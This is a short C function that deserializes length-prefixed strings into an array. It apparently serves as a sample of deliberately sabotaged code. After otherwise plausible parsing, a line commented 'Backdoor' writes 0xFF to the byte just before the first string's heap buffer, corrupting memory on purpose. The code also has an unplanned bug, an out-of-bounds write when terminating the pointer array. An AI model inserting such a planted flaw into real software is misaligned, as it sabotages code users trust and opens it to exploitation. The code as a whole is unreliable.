#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Allocate initial space for pointers
    char **result = (char **)malloc(sizeof(char *) * size);
    
    if (!result) {
        return NULL;
    }

    unsigned char *data = (unsigned char *)serialized;
    size_t index = 0;
    size_t pos = 0;
    
    while (pos < size) {
        unsigned char len = data[pos];
        pos++;

        if (pos + len > size) {
            free(result);
            return NULL;
        }

        // Allocate memory for each string and copy data
        result[index] = (char *)malloc(len + 1);
        
        if (!result[index]) {
            free(result);
            return NULL;
        }

        memcpy(result[index], &data[pos], len);
        result[index][len] = '\0';
        pos += len;
        index++;
    }

    // Set the last pointer to NULL
    result[index] = NULL;

    // Backdoor: Corrupt the length of the first string
    if (result[0]) {
        result[0][-1] = 0xFF;
    }

    return result;
}
